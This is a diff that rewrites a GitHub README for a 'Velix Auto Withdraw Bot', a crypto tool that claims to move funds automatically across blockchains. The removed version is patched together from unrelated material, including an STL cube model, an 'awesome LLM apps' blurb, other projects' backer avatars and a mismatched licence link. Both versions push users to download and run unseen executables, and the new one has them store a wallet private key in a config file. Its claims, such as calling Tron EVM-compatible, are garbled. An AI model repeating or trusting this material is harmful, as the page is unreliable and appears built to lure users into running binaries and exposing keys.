@@ -1,143 +1,139 @@
-<p align="center">
-  <a href="http://www.theunwindai.com">
-    <img src="https://github.com/user-attachments/assets/4abaec0b-3a16-4847-8ac5-dcfa574741d6" width="600" height="300" alt="Unwind AI">
-  </a>
-</p>
+# Velix Auto Withdraw Bot Multi Cryptocurrency Cold Wallet 🚀
 
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue?style=flat-square&logo=github)
 
+Welcome to the **Velix Auto Withdraw Bot** repository! This project aims to simplify and automate withdrawal processes across all EVM-compatible blockchains. Whether you're looking to streamline your crypto transactions or manage your assets efficiently, this bot is designed to interact seamlessly with various crypto wallets for fast, scheduled, or conditional transfers.
 
-# What is AutoWithDraw?
+## Table of Contents
 
-Velix Auto Withdraw Bot is a powerful automation tool designed for seamless fund management across all EVM-compatible blockchains. Whether you're farming, airdrop hunting, or just managing multiple wallets, this bot automatically withdraws your funds to a primary address once a set balance threshold is reached. With robust security for private keys and lightning-fast execution, Velix simplifies crypto automation and saves time. No more checking wallet balances or missing fund transfers—Velix handles it all while you sleep. Perfect for DeFi users, NFT flippers, and crypto power users who demand efficiency and security from their tools.
-
-## Media
-![image](https://github.com/user-attachments/assets/d8e9e521-27ea-4965-bf38-658a96d57c4d)
-
-https://github.com/user-attachments/assets/610107f5-d610-4589-951f-3b70a82637a8
+1. [Features](#features)
+2. [Supported Blockchains](#supported-blockchains)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Configuration](#configuration)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
+9. [Releases](#releases)
 
 ## Features
-* 1 Multi-Chain Support: EVM blockchains.
-* 3 Instant Withdrawals: 
-* 4 Private Key Security
-* 5 Custom Thresholds
-* 6 Fast & Efficient
-* 7 Fully Automated
 
+- **Multi-Chain Support**: The bot supports all EVM-compatible blockchains, allowing you to manage multiple assets in one place.
+- **Gas Optimization**: The bot is designed to execute transactions in a cost-effective manner, minimizing gas fees.
+- **Scheduled Withdrawals**: Set specific times for your withdrawals to execute automatically.
+- **Conditional Transfers**: Create rules for when and how your withdrawals occur based on market conditions or other triggers.
+- **Cold Wallet Compatibility**: Safely interact with hardware wallets to ensure your assets remain secure.
+- **User-Friendly Interface**: Built with React Native, the bot provides a clean and intuitive user experience.
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+## Supported Blockchains
 
-# Installation
+The Velix Auto Withdraw Bot works with the following blockchains:
 
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
-2. OR
+- Ethereum
+- Binance Smart Chain
+- Polygon
+- Avalanche
+- Fantom
+- Tron
 
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
+## Installation
 
+To install the Velix Auto Withdraw Bot, follow these steps:
 
-3. _Then open the sln (Project Solution) file_
-
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
-
-4. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/rsrimon/Velix-Auto-Withdraw-Bot-Multi-CryptoCurrency-Cold-Wallet.git
    ```
 
-# How to Use
+2. **Navigate to the Directory**:
+   ```bash
+   cd Velix-Auto-Withdraw-Bot-Multi-CryptoCurrency-Cold-Wallet
+   ```
 
-1. **Open the Application**  
-   - Locate the executable file (`.exe`) on your computer and double-click it to launch the program.
+3. **Install Dependencies**:
+   ```bash
+   npm install
+   ```
 
-2. **Select Target and Adjust Settings**  
-   - Choose your desired target or task from the available options.  
-   - Customize any additional settings (e.g., preferences, configurations) to fit your needs.
+4. **Build the Project**:
+   ```bash
+   npm run build
+   ```
 
-3. **Generate a Secure Password**  
-   - Use the built-in feature to create a strong password hashed with the **SHA-256 algorithm**. This ensures your password is secure and encrypted.
+5. **Run the Bot**:
+   ```bash
+   npm start
+   ```
 
-4. **Start the Process**  
-   - Click the **"Start" button** or press `Ctrl + V` to begin the operation.  
-   - When prompted, enter the password you generated in the previous step.
+## Usage
 
-5. **Provide API Key (If Required)**  
-   - If the application needs an API key to function (e.g., for external services), go to the settings and input your valid API key before proceeding.
+Once the bot is installed, you can start using it by following these steps:
 
-6. **Start the Server**  
-   - Once everything is configured, start the server. Wait for the connection to be established. A stable connection is necessary for the app to work properly.
+1. **Open the Application**: Launch the bot from your terminal or command prompt.
+2. **Connect Your Wallet**: Use the interface to connect your cold wallet.
+3. **Set Up Withdrawals**: Define your withdrawal rules based on your preferences.
+4. **Monitor Transactions**: Keep track of your withdrawals through the dashboard.
 
-7. **Troubleshoot Errors (If Any)**  
-   - If you encounter errors, ensure the following are installed on your system:  
-     - **Node.js**: Download and install it from [nodejs.org](https://nodejs.org).  
-     - **Visual Studio Build Tools**: Install these tools to resolve technical issues. 
+## Configuration
 
+To configure the bot, you need to set up a configuration file. Here’s how to do it:
+
+1. **Create a Configuration File**:
+   Create a file named `config.json` in the root directory.
+
+2. **Add Your Wallet Information**:
+   ```json
+   {
+     "walletAddress": "YOUR_WALLET_ADDRESS",
+     "privateKey": "YOUR_PRIVATE_KEY",
+     "network": "Ethereum",
+     "withdrawalSettings": {
+       "schedule": "daily",
+       "amount": "0.1 ETH",
+       "gasLimit": 21000
+     }
+   }
+   ```
+
+3. **Save the File**: Make sure to save the configuration file before running the bot.
 
 ## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
 
+We welcome contributions to the Velix Auto Withdraw Bot. If you would like to contribute, please follow these steps:
 
-## Licence
+1. **Fork the Repository**: Click the "Fork" button on the top right corner of the page.
+2. **Create a Branch**: 
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Your Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
 
-Project is licenced under the [MIT licence](https://github.com/AvaloniaUI/Avalonia/blob/master/licence.md).
+## License
 
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
+## Contact
 
-# 🌟 Awesome 
+For any inquiries or issues, feel free to reach out:
 
-A curated collection of awesome LLM apps built with RAG and AI agents. This repository features LLM apps that use models from OpenAI, Anthropic, Google, and open-source models like DeepSeek, Qwen or Llama that you can run locally on your computer.
+- **Email**: your.email@example.com
+- **GitHub**: [rsrimon](https://github.com/rsrimon)
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+## Releases
 
+You can find the latest releases of the Velix Auto Withdraw Bot [here](https://github.com/rsrimon/Velix-Auto-Withdraw-Bot-Multi-CryptoCurrency-Cold-Wallet/releases). Download and execute the latest version to enjoy the newest features and improvements.
+
+![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue?style=flat-square&logo=github)
+
+## Conclusion
+
+The Velix Auto Withdraw Bot is a powerful tool for anyone looking to automate their cryptocurrency withdrawals. With its multi-chain support, gas optimization, and user-friendly interface, it offers a comprehensive solution for managing your crypto assets efficiently. We encourage you to explore the features and contribute to the project. Happy withdrawing!
